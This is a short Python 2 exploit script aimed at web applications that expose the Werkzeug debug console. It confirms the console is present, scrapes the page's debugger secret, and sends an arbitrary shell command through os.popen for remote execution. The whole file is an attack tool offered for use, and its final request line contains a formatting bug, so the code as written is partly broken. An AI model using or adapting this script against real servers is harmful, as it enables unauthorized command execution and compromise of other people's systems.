#!/usr/bin/env python

import requests
import sys
import re
import urllib
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry



if len(sys.argv) != 3:
    print "USAGE: python2 %s <website> <cmd>" % sys.argv[0]
    sys.exit(-1)

session = requests.Session()
retry = Retry(connect=3, backoff_factor=0.5)
adapter = HTTPAdapter(max_retries=retry)
session.mount('http://', adapter)
session.mount('https://', adapter)

try:
    response = session.get('http://%s/console' % sys.argv[1])
except requests.exceptions.ConnectionError:
    print "No connection"
    sys.exit(-1)


if "Werkzeug powered traceback interpreter" not in response.text:
    print "Debug is not enabled"
    sys.exit(-1)

cmd = '''__import__('os').popen(\'%s\').read();''' % sys.argv[2]

response = requests.get('http://%s/console' % sys.argv[1])

secret = re.findall("[0-9a-zA-Z]{20}",response.text)

if len(secret) != 1:
    print "Couldn't get the SECRET"
    sys.exit(-1)
else:
    secret = secret[0]
    print "SECRET is: "+str(secret)

print "Executing '%s' command" % sys.argv[2]

# raw_input("Press any key to execute")

response = requests.get("http://%s/console?__debugger__=yes&cmd=%s&frm=0&s=%s" % sys.argv[1],str(cmd),secret)

print "status code: " + str(response.status_code)
print "response: " + str(response.text)
